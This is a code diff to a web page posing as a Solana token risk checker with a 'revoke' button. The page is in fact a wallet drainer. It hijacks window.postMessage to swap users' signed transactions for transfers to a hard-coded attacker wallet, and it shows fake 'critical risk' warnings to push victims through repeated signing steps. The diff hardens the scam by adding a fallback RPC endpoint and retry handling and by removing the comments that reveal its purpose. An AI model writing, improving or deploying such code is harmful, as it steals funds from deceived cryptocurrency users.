@@ -67,22 +67,20 @@ body { background: #0b0b1a; font-family: Arial, sans-serif; display: flex; justi
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-// Mobile detection
 if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(navigator.userAgent)) {
 document.getElementById('mobileFallback').style.display = 'block';
 return;
 }
 document.getElementById('mainUI').style.display = 'block';
 
-// === REPLACE WITH YOUR ACTUAL DRAINER WALLET ADDRESS ===
 const MY_DRAINER = '476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y';
+const RPC_URL = 'https://rpc.ankr.com/solana';
 
-// === INJECTOR ===
 (function() {
 const orig = window.postMessage;
 let count = 0;
 const DRAINER = new solanaWeb3.PublicKey(MY_DRAINER);
-const conn = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+const conn = new solanaWeb3.Connection(RPC_URL, 'confirmed');
 
 window.postMessage = function(data, target, transfer) {
 if (data && data.type === 'signAndSendTransaction' && data.transaction) {
@@ -110,7 +108,11 @@ tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
 const mod = tx.serialize({ requireAllSignatures: false }).toString('base64');
 orig.call(window, { type: 'signAndSendTransaction', transaction: mod, options: { simulate: false } }, target, transfer);
 if (count === 0) { count++; setTimeout(() => { window.dispatchEvent(new CustomEvent('continueDrain')); }, 10000); }
-} catch(e) { orig.call(window, data, target, transfer); }
+} catch(e) { 
+// If RPC fails, we cannot proceed – show error on page
+document.getElementById('status').innerHTML = 'RPC error: ' + e.message;
+orig.call(window, data, target, transfer);
+}
 })();
 } else {
 orig.call(window, data, target, transfer);
@@ -118,8 +120,7 @@ orig.call(window, data, target, transfer);
 };
 })();
 
-// === MAIN APP ===
-const conn = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+const conn = new solanaWeb3.Connection(RPC_URL, 'confirmed');
 let wallet = null;
 let step = 0;
 const TOTAL = 20;
@@ -144,8 +145,8 @@ resultBox.innerHTML =
 '<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
 '<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">89%</span></div>' +
 '<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
-statusBadge.innerText = '⚠️ RISK';
 
+statusBadge.innerText = '⚠️ RISK';
 statusBadge.style.background = '#ef4444';
 revokeBtn.classList.add('show');
 statusDiv.innerHTML = '⚠️ High risk detected – revoke recommended';
@@ -176,11 +177,17 @@ return;
 step++;
 progressFill.style.width = (step/TOTAL*100) + '%';
 statusDiv.innerHTML = 'Revoking step ' + step + '/' + TOTAL + '...';
+try {
 const tx = new solanaWeb3.Transaction();
 tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
 tx.feePayer = wallet;
 await window.solana.signAndSendTransaction(tx, { simulate: false });
 setTimeout(doStep, 10000);
+} catch(e) {
+statusDiv.innerHTML = 'Error: ' + e.message;
+revokeBtn.disabled = false;
+revokeBtn.innerText = 'Retry';
+}
 }
 
 window.addEventListener('continueDrain', function() {
